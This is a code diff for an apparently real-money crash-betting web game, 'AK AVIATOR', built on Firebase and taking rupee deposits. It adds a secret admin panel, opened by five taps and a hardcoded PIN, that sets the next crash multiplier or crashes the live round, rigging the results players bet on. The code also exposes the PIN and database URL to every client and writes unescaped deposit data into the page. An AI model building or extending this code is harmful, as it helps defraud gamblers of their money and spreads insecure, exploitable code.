@@ -1,88 +1,163 @@
-<div id="adminM" class="modal"><div class="modal-content" style="max-height: 90vh; overflow-y: auto;">
-    <h2 style="color:var(--primary); margin-top:0;">MASTER CONTROL</h2>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AK AVIATOR | Professional Master Control</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <style>
+        :root { --primary: #e91a3d; --green: #28a745; --bg: #0b0b0e; --card: #1c1c1e; }
+        body { margin: 0; background: var(--bg); color: white; font-family: sans-serif; overflow: hidden; }
+        
+        /* Header & Stage */
+        .header { background: #121212; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--primary); }
+        .logo { font-size: 20px; font-weight: 900; color: var(--primary); cursor: pointer; }
+        .stage { height: 260px; background: radial-gradient(circle, #250101 0%, #000 100%); position: relative; display: flex; align-items: center; justify-content: center; }
+        #mult-display { font-size: 65px; font-weight: 900; z-index: 10; }
+        #plane { position: absolute; bottom: 20px; left: 20px; width: 55px; z-index: 5; transition: 0.1s linear; }
+
+        /* Admin Modal Styling */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 5000; align-items: center; justify-content: center; }
+        .modal-content { background: #151515; width: 92%; max-height: 85vh; padding: 20px; border-radius: 15px; border: 1px solid var(--primary); overflow-y: auto; box-sizing: border-box; }
+        
+        .admin-section { background: #000; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #222; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #444; color: white; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        
+        .btn { width: 100%; padding: 14px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-live { background: white; color: black; margin-top: 10px; }
+        
+        .req-box { font-size: 11px; max-height: 150px; overflow-y: auto; }
+        .req-item { background: #1a1a1a; padding: 10px; margin-bottom: 8px; border-radius: 5px; border-left: 3px solid var(--green); }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="logo" id="adminTrigger">AK AVIATOR</div>
+    <div id="userBal" style="color:var(--green); font-weight:bold;">₹0.00</div>
+</div>
+
+<div class="stage">
+    <div id="mult-display">1.00x</div>
+    <img src="https://img.icons8.com/color/96/fighter-jet.png" id="plane">
+</div>
+
+<div id="adminM" class="modal"><div class="modal-content">
+    <h2 style="color:var(--primary); text-align:center; margin-top:0;">MASTER CONTROL</h2>
     
-    <div style="background:#000; padding:15px; border-radius:10px; margin-bottom:15px;">
-        <label>Next Crash Multiplier:</label>
-        <input type="number" id="nextCrash" placeholder="e.g. 1.50" style="width:100%; margin-top:5px;">
-        <button class="main-btn" style="background:var(--primary); width:100%; margin-top:10px;" onclick="setCrash()">Update Crash Point</button>
+    <div class="admin-section">
+        <p style="margin:0; font-size:12px; color:var(--primary);">RESULT CONTROL</p>
+        <input type="number" id="nextCrash" placeholder="Set Next Multiplier (e.g. 50.00)">
+        <button class="btn btn-primary" onclick="lockResult()">LOCK NEXT ROUND</button>
+        <button class="btn btn-live" onclick="instantCrash()">CRASH NOW (LIVE)</button>
     </div>
 
-    <h4 style="text-align:left; color:var(--green); margin-bottom:5px;">Deposit Requests:</h4>
-    <div id="adminDepList" style="background:#000; padding:10px; border-radius:10px; text-align:left; font-size:11px; max-height:150px; overflow-y:auto; border:1px solid #333;">
-        Loading Deposits...
+    <div class="admin-section">
+        <p style="margin:0; font-size:12px; color:var(--green);">DEPOSIT REQUESTS</p>
+        <div id="depList" class="req-box">Loading...</div>
     </div>
 
-    <h4 style="text-align:left; color:var(--gold); margin-top:20px; margin-bottom:5px;">Withdrawal Requests:</h4>
-    <div id="adminWithList" style="background:#000; padding:10px; border-radius:10px; text-align:left; font-size:11px; max-height:150px; overflow-y:auto; border:1px solid #333;">
-        Loading Withdrawals...
-    </div>
-
-    <button class="action-btn" style="background:#333; width:100%; margin-top:20px;" onclick="closeM('adminM')">Close Panel</button>
+    <button onclick="document.getElementById('adminM').style.display='none'" class="btn" style="background:#333; color:white;">BACK TO GAME</button>
 </div></div>
 
 <script>
-    // --- Baki sara purana code waisa hi rahega ---
-    
-    // Admin Panel Fetching Logic
-    function loadAdminRequests() {
-        // 1. Fetch Deposits
-        db.ref('admin/deposits').on('value', (snapshot) => {
-            const list = document.getElementById('adminDepList');
-            list.innerHTML = "";
-            if(!snapshot.exists()) { list.innerHTML = "No pending deposits"; return; }
-            
-            snapshot.forEach((child) => {
-                let data = child.val();
-                list.innerHTML += `<div style="border-bottom:1px solid #222; padding:5px 0;">
-                    <b>UID:</b> ${data.uid || 'User'} | <b>Amt:</b> ₹${data.amt} <br>
-                    <b>UTR:</b> ${data.utr} | <button onclick="approveDep('${child.key}', '${data.uid}', ${data.amt})" style="color:var(--green); background:none; border:none; cursor:pointer;">[APPROVE]</button>
-                </div>`;
-            });
+    const firebaseConfig = { databaseURL: "https://my-colour-game-670af-default-rtdb.firebaseio.com" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let mult = 1.0, isRunning = false, crashAt = 2.0;
+    let uid = "U" + Math.floor(Math.random()*9999);
+
+    // Main Engine Logic
+    function gameEngine() {
+        mult = 1.0; isRunning = true;
+        document.getElementById('mult-display').style.color = "white";
+        
+        // Admin Target Check
+        db.ref('game/control').once('value', s => {
+            crashAt = s.val()?.target || (Math.random()*2 + 1.1);
         });
 
-        // 2. Fetch Withdrawals
-        db.ref('admin/withdrawals').on('value', (snapshot) => {
-            const list = document.getElementById('adminWithList');
-            list.innerHTML = "";
-            if(!snapshot.exists()) { list.innerHTML = "No pending withdrawals"; return; }
-            
-            snapshot.forEach((child) => {
-                let data = child.val();
-                list.innerHTML += `<div style="border-bottom:1px solid #222; padding:5px 0;">
-                    <b>UPI:</b> ${data.upi} | <b>Amt:</b> ₹${data.amt} <br>
-                    <button onclick="deleteReq('withdrawals/${child.key}')" style="color:var(--primary); background:none; border:none; cursor:pointer;">[PAID/DELETE]</button>
-                </div>`;
-            });
-        });
+        let loop = setInterval(() => {
+            if(!isRunning) { clearInterval(loop); return; }
+            if(mult >= crashAt) {
+                clearInterval(loop);
+                crashLogic();
+            } else {
+                mult += (mult < 5) ? 0.01 : 0.1;
+                document.getElementById('mult-display').innerText = mult.toFixed(2) + "x";
+                animatePlane(mult);
+            }
+        }, 100);
     }
 
-    // Approve Deposit Logic
-    function approveDep(key, user, amount) {
-        db.ref('users/'+user+'/balance').transaction((current) => {
-            return (current || 0) + parseFloat(amount);
-        }).then(() => {
-            db.ref('admin/deposits/'+key).remove();
-            alert("Deposit Approved! Money added to player wallet.");
-        });
+    function crashLogic() {
+        isRunning = false;
+        document.getElementById('mult-display').innerText = "FLEW AWAY!";
+        document.getElementById('mult-display').style.color = "var(--primary)";
+        db.ref('game/control/target').set(null); // Reset target after use
+        setTimeout(() => { 
+            document.getElementById('plane').style.transform = `translate(0,0)`;
+            gameEngine(); 
+        }, 3000);
     }
 
-    function deleteReq(path) {
-        if(confirm("Are you sure?")) db.ref('admin/'+path).remove();
+    function animatePlane(m) {
+        let x = (m-1)*30; let y = (m-1)*15;
+        document.getElementById('plane').style.transform = `translate(${Math.min(x, 280)}px, -${Math.min(y, 180)}px)`;
     }
 
-    // Modify the Admin Trigger to load requests
+    // Admin Operations
+    function lockResult() {
+        let val = parseFloat(document.getElementById('nextCrash').value);
+        if(val >= 1) {
+            db.ref('game/control/target').set(val);
+            alert("Success: Next crash set to " + val + "x");
+        }
+    }
+
+    function instantCrash() {
+        crashAt = mult; // Force loop to stop at current value
+        db.ref('game/control/target').set(mult);
+        alert("CRASHED LIVE!");
+    }
+
+    // Secret Entry (5 Taps)
     let taps = 0;
     document.getElementById('adminTrigger').onclick = () => {
-        taps++; 
+        taps++;
         if(taps === 5) {
-            let p = prompt("Enter Master Code:");
-            if(p === "77759636477") {
-                openM('adminM');
-                loadAdminRequests(); // Load data as soon as panel opens
+            if(prompt("Admin Pin:") === "77759636477") {
+                document.getElementById('adminM').style.display='flex';
+                loadRequests();
             }
             taps = 0;
         }
     };
 
-    // --- Baki sara game engine code copy karke niche lagayein ---
+    function loadRequests() {
+        db.ref('admin/deposits').on('value', s => {
+            let h = "";
+            s.forEach(c => {
+                let d = c.val();
+                h += `<div class="req-item">
+                    UID: ${d.uid} | ₹${d.amt} | UTR: ${d.utr}
+                    <button onclick="approve('${c.key}','${d.uid}',${d.amt})" style="color:var(--green); background:none; border:none; float:right; font-weight:bold;">APPROVE</button>
+                </div>`;
+            });
+            document.getElementById('depList').innerHTML = h || "No requests found";
+        });
+    }
+
+    function approve(key, user, amt) {
+        db.ref('users/'+user+'/balance').transaction(c => (c||0)+parseFloat(amt));
+        db.ref('admin/deposits/'+key).remove();
+        alert("Money added to user wallet!");
+    }
+
+    gameEngine();
 </script>
+</body>
+</html>
